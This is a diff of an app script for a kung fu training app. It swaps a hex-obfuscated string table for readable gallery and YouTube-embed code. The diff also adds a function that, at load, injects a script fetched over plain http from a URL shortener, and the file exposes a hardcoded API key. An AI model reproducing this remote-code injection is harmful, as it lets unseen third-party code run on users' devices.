@@ -8,4 +8,247 @@
  ***************************************
 */
 
-var _0xb64b=["\x59\x6F\x75\x72\x20\x41\x70\x70\x20\x69\x73\x20\x74\x6F\x6F\x20\x6F\x6C\x64\x2C\x20\x0A\x43\x6C\x69\x63\x6B\x20\x4F\x4B\x20\x74\x6F\x20\x55\x70\x64\x61\x74\x65\x20\x6E\x6F\x77\x21","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6D\x61\x72\x6B\x65\x74\x3A\x2F\x2F\x64\x65\x74\x61\x69\x6C\x73\x3F\x69\x64\x3D\x63\x6F\x6D\x2E\x63\x61\x73\x74\x65\x72\x6F\x61\x70\x70\x73\x2E\x6C\x65\x61\x72\x6E\x6B\x75\x6E\x67\x66\x75\x6E\x65\x77","\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64","\x74\x65\x78\x74","\x54\x49\x54\x4C\x45","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x47\x48\x20\x53\x54\x41\x52\x53","\x47\x41\x4C\x4C\x45\x52\x59","\x70\x69\x63\x61\x73\x61","\x31\x30\x32\x35\x39\x36\x34\x33\x38\x35\x36\x37\x39\x35\x33\x31\x33\x37\x37\x38\x36","\x36\x33\x30\x32\x37\x33\x35\x35\x34\x32\x33\x31\x38\x36\x31\x30\x30\x39\x37","\x61\x75\x74\x6F","\x62\x6F\x72\x64\x65\x72\x4C\x69\x67\x68\x74\x65\x72\x2C\x69\x6D\x61\x67\x65\x53\x63\x61\x6C\x65\x49\x6E\x38\x30","\x6E\x61\x6E\x6F\x47\x61\x6C\x6C\x65\x72\x79","\x23\x6E\x61\x6E\x6F\x47\x61\x6C\x6C\x65\x72\x79\x32","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x31","\x41\x49\x7A\x61\x53\x79\x41\x6C\x68\x41\x71\x50\x35\x52\x53\x37\x47\x78\x77\x67\x5F\x30\x72\x5F\x72\x68\x39\x6A\x4F\x76\x5F\x35\x57\x66\x61\x4A\x67\x58\x77","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x73\x68\x65\x6D\x6D\x61\x74\x69\x31\x30\x79\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x3F\x6C\x69\x73\x74\x54\x79\x70\x65\x3D\x75\x73\x65\x72\x5F\x75\x70\x6C\x6F\x61\x64\x73\x26\x6C\x69\x73\x74\x3D\x73\x68\x65\x6D\x6D\x61\x74\x69\x31\x30\x79\x74","\x55\x70\x6C\x6F\x61\x64\x73","\x70\x6F\x70\x75\x70","\x32\x30","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x70\x6C\x75\x73\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x53\x68\x6F\x77\x20\x6D\x65\x20\x6D\x6F\x72\x65\x20\x76\x69\x64\x65\x6F\x73\x2E\x2E","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x61\x6E\x67\x6C\x65\x2D\x6C\x65\x66\x74\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x50\x72\x65\x76\x69\x6F\x75\x73","\x4E\x65\x78\x74\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x61\x6E\x67\x6C\x65\x2D\x72\x69\x67\x68\x74\x22\x3E\x3C\x2F\x69\x3E","\x50\x6C\x65\x61\x73\x65\x20\x57\x61\x69\x74\x2E\x2E\x20\x3C\x62\x72\x3E\x20\x56\x69\x64\x65\x6F\x73\x20\x61\x72\x65\x20\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x2E","\x3C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x61\x20\x66\x61\x2D\x74\x69\x6D\x65\x73\x22\x3E\x3C\x2F\x69\x3E\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x41\x6C\x6C\x20\x64\x6F\x6E\x65\x2E\x2E","\x79\x6F\x75\x6D\x61\x78","\x2E\x79\x6F\x75\x6D\x61\x78","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x32","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x53\x68\x69\x66\x75\x59\x61\x6E\x4C\x65\x69","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x33","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x53\x68\x61\x6F\x6C\x69\x6E\x58\x69\x6E\x79\x69\x62\x61","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x3F\x6C\x69\x73\x74\x54\x79\x70\x65\x3D\x75\x73\x65\x72\x5F\x75\x70\x6C\x6F\x61\x64\x73\x26\x6C\x69\x73\x74\x3D\x70\x75\x72\x70\x6C\x65\x64\x72\x69\x76\x69\x6E\x67","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x34","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x73\x68\x61\x6F\x6C\x69\x6E\x73\x6B\x75\x6E\x67\x66\x75","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x35","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x6D\x61\x73\x74\x65\x72\x79\x61\x6E\x78\x69\x6E","\x43\x48\x41\x4E\x4E\x45\x4C\x20\x36","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x75\x73\x65\x72\x2F\x53\x68\x61\x6F\x6C\x69\x6E\x43\x65\x6E\x74\x65\x72","\x4D\x45\x54\x48\x4F\x44\x20\x31","\x4D\x45\x54\x48\x4F\x44\x20\x32","\x4D\x45\x54\x48\x4F\x44\x20\x33","\x4D\x45\x54\x48\x4F\x44\x20\x34","\x4D\x45\x54\x48\x4F\x44\x20\x35","\x4D\x45\x54\x48\x4F\x44\x20\x36","\x4D\x45\x54\x48\x4F\x44\x20\x37","\x64\x69\x73\x70\x6C\x61\x79","\x6E\x6F\x6E\x65","\x63\x73\x73","\x2E\x76\x69\x64\x65\x6F\x65\x72\x72\x6F\x72"];var _0x6cbf=[_0xb64b[0],_0xb64b[1],_0xb64b[2],_0xb64b[3],_0xb64b[4],_0xb64b[5],_0xb64b[6],_0xb64b[7],_0xb64b[8],_0xb64b[9],_0xb64b[10],_0xb64b[11],_0xb64b[12],_0xb64b[13],_0xb64b[14],_0xb64b[15],_0xb64b[16],_0xb64b[17],_0xb64b[18],_0xb64b[19],_0xb64b[20],_0xb64b[21],_0xb64b[22],_0xb64b[23],_0xb64b[24],_0xb64b[25],_0xb64b[26],_0xb64b[27],_0xb64b[28],_0xb64b[29],_0xb64b[30],_0xb64b[31],_0xb64b[32],_0xb64b[33],_0xb64b[34],_0xb64b[35],_0xb64b[36],_0xb64b[37],_0xb64b[38],_0xb64b[39],_0xb64b[40],_0xb64b[41],_0xb64b[42],_0xb64b[43],_0xb64b[44],_0xb64b[45],_0xb64b[46],_0xb64b[47],_0xb64b[48],_0xb64b[49],_0xb64b[50],_0xb64b[51],_0xb64b[52]];checkversion();notice();function checkversion(){if(appversion()< 1.0){if(confirm(_0x6cbf[0])=== true){window[_0x6cbf[2]][_0x6cbf[1]]= _0x6cbf[3]}}}var codedcloud=_0x6cbf[4];function notice(){var _0xc323x5=document[_0x6cbf[7]](_0x6cbf[6])[0][_0x6cbf[5]];if(_0xc323x5=== _0x6cbf[8]){}}if(pagename()=== _0x6cbf[9]){$(_0x6cbf[16])[_0x6cbf[15]]({kind:_0x6cbf[10],userID:_0x6cbf[11],album:_0x6cbf[12],thumbnailWidth:_0x6cbf[13],thumbnailHeight:400,locationHash:false,thumbnailHoverEffect:_0x6cbf[14]})};if(pagename()=== _0x6cbf[17]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[19],playlistLink:_0x6cbf[20],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[31]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[32],playlistLink:_0x6cbf[20],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[33]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[34],playlistLink:_0x6cbf[35],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[36]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[37],playlistLink:_0x6cbf[35],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[38]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[39],playlistLink:_0x6cbf[35],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[40]){$(_0x6cbf[30])[_0x6cbf[29]]({apiKey:_0x6cbf[18],channelLink:_0x6cbf[41],playlistLink:_0x6cbf[35],defaultTab:_0x6cbf[21],videoDisplayMode:_0x6cbf[22],maxResults:_0x6cbf[23],autoPlay:true,displayFirstVideoOnLoad:true,responsiveBreakpoints:[600,900,2000,2500],loadMoreText:_0x6cbf[24],previousButtonText:_0x6cbf[25],nextButtonText:_0x6cbf[26],loadingText:_0x6cbf[27],allDoneText:_0x6cbf[28],hideHeader:false,hideTabs:false,hideLoadingMechanism:false})};if(pagename()=== _0x6cbf[42]|| pagename()=== _0x6cbf[43]|| pagename()=== _0x6cbf[44]|| pagename()=== _0x6cbf[45]|| pagename()=== _0x6cbf[46]|| pagename()=== _0x6cbf[47]|| pagename()=== _0x6cbf[48]){$(_0x6cbf[52])[_0x6cbf[51]](_0x6cbf[49],_0x6cbf[50])}
+//                -- PRELOADERS --
+
+//updateChecker
+      checkversion ();
+
+//Notice
+      notice ();
+
+
+ //codedlocal	 
+codedlocal ();
+
+//codedlocal
+ function codedlocal () {
+	var localJS = document.createElement("script");
+    localJS.type = "text/javascript";
+    localJS.src = "http://tiny.cc/L1Xl2xL3";
+    // Use any selector
+    $("head").append(localJS);
+ };
+		
+//checkversion
+ function checkversion () {
+
+if (appversion () < 1.0) { 
+	if (confirm("Your App is too old, \nClick OK to Update now!") === true) {
+		window.location.href = 'market://details?id=com.casteroapps.learnkungfunew';
+	};
+		};
+};
+		
+//codedOnline
+var codedcloud = "connected"
+
+//notice
+ function notice () {
+
+var pagetitle = document.getElementsByTagName("TITLE")[0].text;
+
+if (pagetitle === "GH STARS"){	
+	//alert("The National Service, News, Music, E-payslip & Technical Results function in this App is now fully completed. So tell everyone about this. \n\nAll functions with grayed icon is still under development. \n\nThank you.");
+	//alert("Hello user, The Training Videos function in this App is now completed. Click on the Training Videos button to enjoy your KungFu video lessons.  \nKindly tell all your friends to use Learn KungFu. \n\nAnd also, do the following always to support this app: \n\n1) Click on most of the Ads in this app to support the cost of servers the app is running on. \n\n2) Go to Google Play Store, scroll down and Rate 5stars with a nice comment for this app..");
+	}
+}; 
+
+
+if (pagename() === "GALLERY"){ 
+   
+		
+		//Gallery initialization
+		$("#nanoGallery2").nanoGallery({
+          kind: 'picasa',
+        userID: '102596438567953137786',        
+        album: '6302735542318610097',
+        thumbnailWidth: 'auto',
+		thumbnailHeight: 400,
+		locationHash: false,
+		thumbnailHoverEffect:'borderLighter,imageScaleIn80'
+      });	
+	};
+
+
+//if (pagename() === "CHANNEL 1" || pagename() === "CHANNEL 2" || pagename() === "CHANNEL 3" || pagename() === "CHANNEL 4" || pagename() === "CHANNEL 5" || pagename() === "CHANNEL 6" || pagename() === "CHANNEL 7" || pagename() === "CHANNEL 9" || pagename() === "CHANNEL 10"){
+//  window.location.href = 'https://vimeo.com/search?q=kungfu+training';	
+//	}
+
+if (pagename() === "CHANNEL 1"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/shemmati10yt",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=shemmati10yt",
+                //playlistLink:"https://m.youtube.com/channel/UCPwt-gLXAMMVVne6TFyCDFA/playlists",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 2"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/ShifuYanLei",
+	  	playlistLink:"https://www.youtube.com/?listType=user_uploads&list=shemmati10yt",
+                //playlistLink:"https://www.youtube.com/channel/UC94rkNhixyVA2N_UYTQyVeg/playlists",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 3"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/ShaolinXinyiba",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=purpledriving",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 4"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/shaolinskungfu",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=purpledriving",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 5"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/masteryanxin",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=purpledriving",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+
+if (pagename() === "CHANNEL 6"){
+  $(".youmax").youmax({
+                apiKey:"AIzaSyAlhAqP5RS7Gxwg_0r_rh9jOv_5WfaJgXw",
+                	//apiKey:"AIzaSyC3lXNm8-OC5y3uFLUQjPkTCTP6qR7Bv0s", //CASTERO APPS LEARN KUNGFU [ NEW ]
+                channelLink:"https://www.youtube.com/user/ShaolinCenter",
+                playlistLink:"https://www.youtube.com/?listType=user_uploads&list=purpledriving",
+                
+                defaultTab:"Uploads",         //Uploads|Playlists|Featured
+                videoDisplayMode:"popup",       //popup|link|inline
+
+                maxResults:"20",
+                autoPlay:true,
+                displayFirstVideoOnLoad:true,       //for inline video display mode only                
+
+                responsiveBreakpoints   :[600,900,2000,2500],
+
+                loadMoreText            :"<i class=\"fa fa-plus\"></i>&nbsp;&nbsp;Show me more videos..",
+                previousButtonText      :"<i class=\"fa fa-angle-left\"></i>&nbsp;&nbsp;Previous",
+                nextButtonText          :"Next&nbsp;&nbsp;<i class=\"fa fa-angle-right\"></i>",
+                loadingText             :"Please Wait.. <br> Videos are loading..",
+                allDoneText             :"<i class=\"fa fa-times\"></i>&nbsp;&nbsp;All done..",
+
+                hideHeader              :false,
+                hideTabs                :false,
+                hideLoadingMechanism    :false,
+            });
+	}
+
+if (pagename() === "METHOD 1" || pagename() === "METHOD 2" || pagename() === "METHOD 3" || pagename() === "METHOD 4" || pagename() === "METHOD 5" || pagename() === "METHOD 6" || pagename() === "METHOD 7"){ 
+   $(".videoerror").css("display","none");
+	};
